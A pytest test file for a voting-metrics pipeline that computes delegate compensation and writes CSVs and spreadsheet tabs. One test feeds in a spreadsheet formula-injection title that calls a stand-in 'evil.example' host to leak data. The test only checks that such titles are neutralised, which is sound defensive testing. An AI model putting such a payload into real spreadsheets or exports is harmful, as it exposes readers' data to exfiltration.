"""Tests for pipeline.run_fetch / pipeline.run_finalize and their helpers."""

import argparse
from datetime import date
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import gspread
import pandas as pd
import pytest

from ad_voting_metrics import pipeline, sheets
from ad_voting_metrics.compensation import CompensationConfig, PeriodCompensation
from ad_voting_metrics.period import MonthPeriod
from ad_voting_metrics.pipeline import (
    _build_sky_and_ranking_frames,
    _window_start_for_period,
    _write_fetch_csvs,
    _write_fetch_workbook_tabs,
    run_fetch,
    run_finalize,
)
from ad_voting_metrics.roster import Delegate

_DEFAULT_CONFIG = CompensationConfig(l1_usds=33333.0, l2_usds=14583.0, l3_usds=4000.0, total_slots=6)
_DEFAULT_PERIOD = MonthPeriod(year=2026, month=4)


def _empty_daily_df() -> pd.DataFrame:
    return pd.DataFrame(columns=list(sheets.DAILY_DATA_COLUMNS))


def _empty_participation_df() -> pd.DataFrame:
    return pd.DataFrame(
        columns=["Delegate", "Poll Id", "Start Date", "End Date", "Title", "Participation Status"],
    )


def _empty_communication_df() -> pd.DataFrame:
    return pd.DataFrame(
        columns=["Delegate", "Poll Id", "Start Date", "End Date", "Title", "Communication Status"],
    )


def _empty_roster() -> MagicMock:
    """Build a MagicMock shaped like a RosterResult with no delegates."""
    return MagicMock(
        active_delegates=[],
        drift_warnings=[],
        yaml_config=MagicMock(delegates=[]),
        api_delegate_count=0,
        api_fetch_succeeded=True,
    )


@pytest.fixture
def finalize_mocks():
    """Patch the workbook-IO functions run_finalize touches and yield handles to each.

    Defaults assume the happy path: empty roster, empty workbook tabs, get_workbook returns a MagicMock,
    read_config returns _DEFAULT_CONFIG. Tests override only the mocks they care about.
    """
    with (
        patch("ad_voting_metrics.pipeline.sheets.get_workbook") as get_workbook,
        patch("ad_voting_metrics.pipeline.sheets.read_config", return_value=_DEFAULT_CONFIG) as read_config,
        patch("ad_voting_metrics.pipeline.build_roster_for_period") as build_roster,
        patch("ad_voting_metrics.pipeline.sheets.read_daily_data") as read_daily,
        patch("ad_voting_metrics.pipeline.sheets.read_participation_for_window") as read_participation,
        patch("ad_voting_metrics.pipeline.sheets.read_communication_master") as read_communication,
        patch("ad_voting_metrics.pipeline.sheets.write_compensation_tab") as write_compensation,
        patch("ad_voting_metrics.pipeline.write_entry") as write_entry,
    ):
        get_workbook.return_value = MagicMock()
        read_daily.return_value = _empty_daily_df()
        read_participation.return_value = _empty_participation_df()
        read_communication.return_value = _empty_communication_df()
        build_roster.return_value = _empty_roster()
        yield SimpleNamespace(
            get_workbook=get_workbook,
            read_config=read_config,
            build_roster=build_roster,
            read_daily=read_daily,
            read_participation=read_participation,
            read_communication=read_communication,
            write_compensation=write_compensation,
            write_entry=write_entry,
        )


# ---------------------------------------------------------------------------
# _window_start_for_period
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("period_year", "period_month", "expected"),
    [
        (2026, 4, date(2025, 11, 1)),  # rolls back across year boundary
        (2026, 1, date(2025, 8, 1)),  # rolls back further
        (2026, 6, date(2026, 1, 1)),  # same year
    ],
)
def test_window_start_for_period(period_year, period_month, expected):
    assert _window_start_for_period(MonthPeriod(year=period_year, month=period_month)) == expected


# ---------------------------------------------------------------------------
# run_finalize — orchestration
# ---------------------------------------------------------------------------


def _make_finalize_args(month: MonthPeriod | None = None) -> argparse.Namespace:
    return argparse.Namespace(
        command="finalize",
        month=month or MonthPeriod(year=2026, month=4),
    )


def test_run_finalize_workbook_open_failure_exits(finalize_mocks):
    finalize_mocks.get_workbook.side_effect = RuntimeError("auth failure")
    with pytest.raises(SystemExit):
        run_finalize(_make_finalize_args())


def test_run_finalize_config_missing_exits(finalize_mocks):
    finalize_mocks.read_config.side_effect = RuntimeError("Config tab missing")
    with pytest.raises(SystemExit):
        run_finalize(_make_finalize_args())


def test_run_finalize_daily_data_missing_exits(finalize_mocks):
    """Case A: Daily Data tab has no rows for the period → SystemExit."""
    finalize_mocks.read_daily.side_effect = RuntimeError("no rows for April 2026")
    with pytest.raises(SystemExit):
        run_finalize(_make_finalize_args())


def test_run_finalize_communication_master_missing_exits(finalize_mocks):
    finalize_mocks.read_communication.side_effect = RuntimeError("Communication Master missing")
    with pytest.raises(SystemExit):
        run_finalize(_make_finalize_args())


def test_run_finalize_compensation_write_failure_exits(finalize_mocks):
    """A failed write_compensation_tab surfaces as SystemExit."""
    finalize_mocks.write_compensation.side_effect = RuntimeError("API error")
    with pytest.raises(SystemExit):
        run_finalize(_make_finalize_args())


def test_run_finalize_happy_path_empty_roster_writes_comp_tab(finalize_mocks):
    """Smallest happy path: empty roster, comp tab written successfully."""
    run_finalize(_make_finalize_args(_DEFAULT_PERIOD))

    finalize_mocks.write_compensation.assert_called_once()
    _, period_comp = finalize_mocks.write_compensation.call_args.args
    assert isinstance(period_comp, PeriodCompensation)
    assert period_comp.period == _DEFAULT_PERIOD
    assert period_comp.config == _DEFAULT_CONFIG
    assert period_comp.per_delegate == []

    # Verify finalize asks roster to skip the API drift check.
    finalize_mocks.build_roster.assert_called_once()
    assert finalize_mocks.build_roster.call_args.kwargs.get("skip_api_check") is True


def test_run_finalize_eligibility_tie_at_cutoff_exits(finalize_mocks):
    """A tie at the L3 slot cutoff propagates as SystemExit."""
    delegates = [
        Delegate(
            name=f"D{i}",
            vote_delegate_address=f"0x{'a' * 39}{i}",
            start_date=date(2024, 1, 1),
        )
        for i in range(7)
    ]
    # All ranked 6 → tie crossing the 6-slot cutoff.
    finalize_mocks.read_daily.return_value = pd.DataFrame([
        {"Date": date(2026, 4, d), "Delegate": f"D{i}", "Total Delegation": 100.0, "Rank": 6}
        for d in range(1, 31)
        for i in range(7)
    ])
    # Perfect participation/communication so every delegate is eligible.
    finalize_mocks.read_participation.return_value = pd.DataFrame([
        {
            "Delegate": f"D{i}",
            "Poll Id": f"poll_{j}",
            "Start Date": date(2026, 2, 1),
            "End Date": date(2026, 2, 2),
            "Title": "",
            "Participation Status": "Yes",
        }
        for i in range(7)
        for j in range(10)
    ])
    finalize_mocks.read_communication.return_value = pd.DataFrame([
        {
            "Delegate": f"D{i}",
            "Poll Id": f"poll_{j}",
            "Start Date": date(2026, 2, 1),
            "End Date": date(2026, 2, 2),
            "Title": "",
            "Communication Status": "Yes",
        }
        for i in range(7)
        for j in range(10)
    ])
    finalize_mocks.build_roster.return_value = MagicMock(
        active_delegates=delegates,
        drift_warnings=[],
        yaml_config=MagicMock(delegates=delegates),
        api_delegate_count=0,
        api_fetch_succeeded=True,
    )

    with pytest.raises(SystemExit):
        run_finalize(_make_finalize_args())


def test_run_finalize_includes_delegate_who_exited_mid_period(finalize_mocks):
    """A delegate who exits mid-period earned slot-days and must get a compensation row, not crash finalize.

    Regression: final_metrics was sourced from the last day's eligibility, which omits a mid-period
    exiter; compute_period_compensation then raised on the missing entry and aborted the whole run.
    """
    delegates = [
        Delegate(name="Stayer", vote_delegate_address=f"0x{'a' * 39}1", start_date=date(2024, 1, 1)),
        Delegate(
            name="Exiter",
            vote_delegate_address=f"0x{'b' * 39}2",
            start_date=date(2024, 1, 1),
            end_date=date(2026, 4, 15),  # exits mid-April; absent on the period's last day
        ),
    ]
    # Stayer is ranked every day; Exiter only through April 15 (when they were still active).
    daily_rows = [
        {"Date": date(2026, 4, d), "Delegate": "Stayer", "Total Delegation": 200.0, "Rank": 1} for d in range(1, 31)
    ] + [{"Date": date(2026, 4, d), "Delegate": "Exiter", "Total Delegation": 100.0, "Rank": 2} for d in range(1, 16)]
    finalize_mocks.read_daily.return_value = pd.DataFrame(daily_rows)
    finalize_mocks.read_participation.return_value = pd.DataFrame([
        {
            "Delegate": name,
            "Poll Id": f"poll_{j}",
            "Start Date": date(2026, 2, 1),
            "End Date": date(2026, 2, 2),
            "Title": "",
            "Participation Status": "Yes",
        }
        for name in ("Stayer", "Exiter")
        for j in range(3)
    ])
    finalize_mocks.read_communication.return_value = pd.DataFrame([
        {
            "Delegate": name,
            "Poll Id": f"poll_{j}",
            "Start Date": date(2026, 2, 1),
            "End Date": date(2026, 2, 2),
            "Title": "",
            "Communication Status": "Yes",
        }
        for name in ("Stayer", "Exiter")
        for j in range(3)
    ])
    finalize_mocks.build_roster.return_value = MagicMock(
        active_delegates=delegates,
        drift_warnings=[],
        yaml_config=MagicMock(delegates=delegates),
        api_delegate_count=0,
        api_fetch_succeeded=True,
    )

    run_finalize(_make_finalize_args())  # must not SystemExit

    finalize_mocks.write_compensation.assert_called_once()
    _, period_comp = finalize_mocks.write_compensation.call_args.args
    names = {r.name for r in period_comp.per_delegate}
    assert names == {"Stayer", "Exiter"}


def test_run_finalize_logs_drift_warnings(finalize_mocks):
    """Drift warnings from the roster are emitted via logger.warning."""
    finalize_mocks.build_roster.return_value = MagicMock(
        active_delegates=[],
        drift_warnings=["YAML/API drift: delegate X missing from API"],
        yaml_config=MagicMock(delegates=[]),
        api_delegate_count=0,
        api_fetch_succeeded=True,
    )

    with patch.object(pipeline.logger, "warning") as warning_mock:
        run_finalize(_make_finalize_args())

    warning_mock.assert_any_call("YAML/API drift: delegate X missing from API")


# ---------------------------------------------------------------------------
# _build_sky_and_ranking_frames — pure delegation-output transform
# ---------------------------------------------------------------------------


def test_build_sky_and_ranking_frames_sorts_sky_and_ranks_delegates():
    """df_sky sorted by (date, sky, contract) desc; df_ranking has Rank per date."""
    period = MonthPeriod(year=2026, month=4)
    canned = pd.DataFrame([
        {"contract": "0xa", "name": "alpha", "date": date(2026, 4, 1), "sky": 100.0},
        {"contract": "0xb", "name": "beta", "date": date(2026, 4, 1), "sky": 300.0},
        {"contract": "0xc", "name": "gamma", "date": date(2026, 4, 1), "sky": 200.0},
    ])
    df_input = pd.DataFrame({
        "Delegate Name": ["alpha", "beta", "gamma"],
        "Delegate Contract": ["0xa", "0xb", "0xc"],
        "Start Date": ["2024-01-01"] * 3,
    })

    with patch(
        "ad_voting_metrics.pipeline.delegation.get_delegate_list_sky",
        return_value=canned,
    ) as delegation_mock:
        df_sky, df_ranking = _build_sky_and_ranking_frames(df_input, period, rebuild=False)

    delegation_mock.assert_called_once_with(df_input, period, rebuild=False)

    # df_sky: highest sky first (300), then 200, then 100.
    assert df_sky.iloc[0]["sky"] == 300.0
    assert df_sky.iloc[-1]["sky"] == 100.0

    # df_ranking: ranks computed from Total Delegation desc per Date.
    ranks_by_delegate = df_ranking.set_index("Delegate")["Rank"].to_dict()
    assert ranks_by_delegate == {"beta": 1, "gamma": 2, "alpha": 3}


# ---------------------------------------------------------------------------
# _write_fetch_csvs — file IO to OUTPUT_DIR
# ---------------------------------------------------------------------------


def test_write_fetch_csvs_writes_both_files_and_returns_paths(tmp_path, monkeypatch):
    """Writes sky.csv and vote_participation.csv to OUTPUT_DIR; returns both paths in order."""
    monkeypatch.setattr(pipeline, "OUTPUT_DIR", tmp_path)

    df_sky = pd.DataFrame([{"contract": "0xa", "date": date(2026, 4, 1), "sky": 100.0}])
    df = pd.DataFrame({
        "Delegate Name": ["alpha"],
        "Delegate Contract": ["0xa"],
        "Start Date": ["2024-01-01"],
        "101": ["Yes"],
    })
    poll_info = [{"pollId": 101, "startDate": date(2026, 4, 1), "endDate": date(2026, 4, 3), "title": "Test"}]
    spell_info: list[dict] = []

    result = _write_fetch_csvs(df, df_sky, poll_info, spell_info)

    assert [p.name for p in result] == ["sky.csv", "vote_participation.csv"]
    assert all(p.exists() for p in result)
    assert (tmp_path / "sky.csv").read_text().splitlines()[0] == "contract,date,sky"


def test_write_fetch_csvs_defuses_formula_like_titles(tmp_path, monkeypatch):
    """API-sourced titles starting with a formula character are quoted so spreadsheet apps render them as text."""
    monkeypatch.setattr(pipeline, "OUTPUT_DIR", tmp_path)

    df_sky = pd.DataFrame([{"contract": "0xa", "date": date(2026, 4, 1), "sky": 100.0}])
    df = pd.DataFrame({
        "Delegate Name": ["alpha"],
        "Delegate Contract": ["0xa"],
        "Start Date": ["2024-01-01"],
        "101": ["Yes"],
    })
    poll_info = [
        {
            "pollId": 101,
            "startDate": date(2026, 4, 1),
            "endDate": date(2026, 4, 3),
            "title": '=IMPORTDATA("https://evil.example/leak")',
        },
    ]

    _write_fetch_csvs(df, df_sky, poll_info, [])

    participation = (tmp_path / "vote_participation.csv").read_text()
    assert "'=IMPORTDATA" in participation
    assert '"=IMPORTDATA' not in participation


# ---------------------------------------------------------------------------
# _write_fetch_workbook_tabs — sheets writer orchestration
# ---------------------------------------------------------------------------


def test_write_fetch_workbook_tabs_calls_three_writers_on_success():
    """All three tab writers are invoked when get_workbook succeeds."""
    period = MonthPeriod(year=2026, month=4)
    workbook = MagicMock()

    with (
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", return_value=workbook),
        patch("ad_voting_metrics.pipeline.sheets.write_participation_raw_data") as p_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
    ):
        _write_fetch_workbook_tabs(period, pd.DataFrame(), pd.DataFrame(), [], [])

    p_mock.assert_called_once()
    c_mock.assert_called_once()
    d_mock.assert_called_once()


def test_write_fetch_workbook_tabs_skips_tabs_when_workbook_open_fails():
    """If get_workbook raises RuntimeError, no tab writer runs and no exception propagates."""
    period = MonthPeriod(year=2026, month=4)

    with (
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", side_effect=RuntimeError("auth")),
        patch("ad_voting_metrics.pipeline.sheets.write_participation_raw_data") as p_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
    ):
        _write_fetch_workbook_tabs(period, pd.DataFrame(), pd.DataFrame(), [], [])

    p_mock.assert_not_called()
    c_mock.assert_not_called()
    d_mock.assert_not_called()


def test_write_fetch_workbook_tabs_continues_after_value_error():
    """A ValueError from one writer is logged; remaining writers still run."""
    period = MonthPeriod(year=2026, month=4)
    workbook = MagicMock()

    with (
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", return_value=workbook),
        patch(
            "ad_voting_metrics.pipeline.sheets.write_participation_raw_data",
            side_effect=ValueError("bad df"),
        ),
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
    ):
        _write_fetch_workbook_tabs(period, pd.DataFrame(), pd.DataFrame(), [], [])

    c_mock.assert_called_once()
    d_mock.assert_called_once()


def test_write_fetch_workbook_tabs_continues_after_gspread_api_error():
    """A gspread APIError from a writer is logged; remaining writers still run."""
    period = MonthPeriod(year=2026, month=4)
    workbook = MagicMock()
    # APIError's constructor takes a response; mimic the bits the formatter touches.
    api_error = gspread.exceptions.APIError(MagicMock(status_code=500, json=dict))

    with (
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", return_value=workbook),
        patch(
            "ad_voting_metrics.pipeline.sheets.write_participation_raw_data",
            side_effect=api_error,
        ),
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
    ):
        _write_fetch_workbook_tabs(period, pd.DataFrame(), pd.DataFrame(), [], [])

    c_mock.assert_called_once()
    d_mock.assert_called_once()


# ---------------------------------------------------------------------------
# run_fetch — end-to-end orchestration with everything mocked
# ---------------------------------------------------------------------------


def _make_fetch_args(
    month: MonthPeriod | None = None,
    *,
    rebuild: bool = False,
) -> argparse.Namespace:
    return argparse.Namespace(
        command="fetch",
        month=month or MonthPeriod(year=2026, month=4),
        rebuild=rebuild,
    )


def _canned_delegation_outputs(period: MonthPeriod, contract: str, name: str) -> pd.DataFrame:
    """Return a sky_protocol-shaped DataFrame covering one delegate for every day in period."""
    days = list(pd.date_range(period.start, period.end, freq="D").date)
    return pd.DataFrame([{"contract": contract, "name": name, "date": d, "sky": 100.0} for d in days])


def test_run_fetch_writes_csvs_and_workbook_tabs(tmp_path, monkeypatch):
    """End-to-end fetch with all externals mocked → CSVs + 3 workbook tabs written."""
    monkeypatch.setattr(pipeline, "OUTPUT_DIR", tmp_path)
    monkeypatch.setattr(pipeline, "RECONCILIATION_LOG_PATH", tmp_path / "rec")

    period = MonthPeriod(year=2026, month=4)
    contract = "0x" + "a" * 40
    delegates = [
        Delegate(name="alpha", vote_delegate_address=contract, start_date=date(2024, 1, 1)),
    ]
    canned = _canned_delegation_outputs(period, contract, "alpha")

    with (
        patch("ad_voting_metrics.pipeline.build_roster_for_period") as mock_roster,
        patch("ad_voting_metrics.pipeline.delegation.get_delegate_list_sky", return_value=canned),
        patch("ad_voting_metrics.pipeline.sky_polling.fetch_polls_for_period", return_value=[]),
        patch("ad_voting_metrics.pipeline.sky_executive.fetch_spells_for_period", return_value=[]),
        patch(
            "ad_voting_metrics.pipeline.sky_polling.add_poll_vote_statuses",
            side_effect=lambda _poll_info, df, _sky_lookup, current_datetime: df,  # noqa: ARG005
        ),
        patch(
            "ad_voting_metrics.pipeline.sky_executive.add_spell_vote_statuses",
            side_effect=lambda _spell_info, df, _sky_lookup: df,
        ),
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", return_value=MagicMock()),
        patch("ad_voting_metrics.pipeline.sheets.write_participation_raw_data") as p_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
        patch("ad_voting_metrics.pipeline.write_entry") as entry_mock,
    ):
        mock_roster.return_value = MagicMock(
            active_delegates=delegates,
            drift_warnings=[],
            yaml_config=MagicMock(delegates=delegates),
            api_delegate_count=1,
            api_fetch_succeeded=True,
        )
        run_fetch(_make_fetch_args(period, rebuild=False))

    assert (tmp_path / "sky.csv").exists()
    assert (tmp_path / "vote_participation.csv").exists()
    p_mock.assert_called_once()
    c_mock.assert_called_once()
    d_mock.assert_called_once()
    entry_mock.assert_called_once()


def test_run_fetch_logs_drift_warnings(tmp_path, monkeypatch):
    """Drift warnings on the roster surface through logger.warning."""
    monkeypatch.setattr(pipeline, "OUTPUT_DIR", tmp_path)
    monkeypatch.setattr(pipeline, "RECONCILIATION_LOG_PATH", tmp_path / "rec")

    period = MonthPeriod(year=2026, month=4)
    contract = "0x" + "b" * 40
    delegates = [
        Delegate(name="beta", vote_delegate_address=contract, start_date=date(2024, 1, 1)),
    ]
    canned = _canned_delegation_outputs(period, contract, "beta")

    with (
        patch("ad_voting_metrics.pipeline.build_roster_for_period") as mock_roster,
        patch("ad_voting_metrics.pipeline.delegation.get_delegate_list_sky", return_value=canned),
        patch("ad_voting_metrics.pipeline.sky_polling.fetch_polls_for_period", return_value=[]),
        patch("ad_voting_metrics.pipeline.sky_executive.fetch_spells_for_period", return_value=[]),
        patch(
            "ad_voting_metrics.pipeline.sky_polling.add_poll_vote_statuses",
            side_effect=lambda _poll_info, df, _sky_lookup, current_datetime: df,  # noqa: ARG005
        ),
        patch(
            "ad_voting_metrics.pipeline.sky_executive.add_spell_vote_statuses",
            side_effect=lambda _spell_info, df, _sky_lookup: df,
        ),
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", side_effect=RuntimeError("no workbook")),
        patch("ad_voting_metrics.pipeline.write_entry"),
        patch.object(pipeline.logger, "warning") as warning_mock,
    ):
        mock_roster.return_value = MagicMock(
            active_delegates=delegates,
            drift_warnings=["YAML lists Z but API doesn't"],
            yaml_config=MagicMock(delegates=delegates),
            api_delegate_count=1,
            api_fetch_succeeded=True,
        )
        run_fetch(_make_fetch_args(period))

    warning_mock.assert_any_call("YAML lists Z but API doesn't")
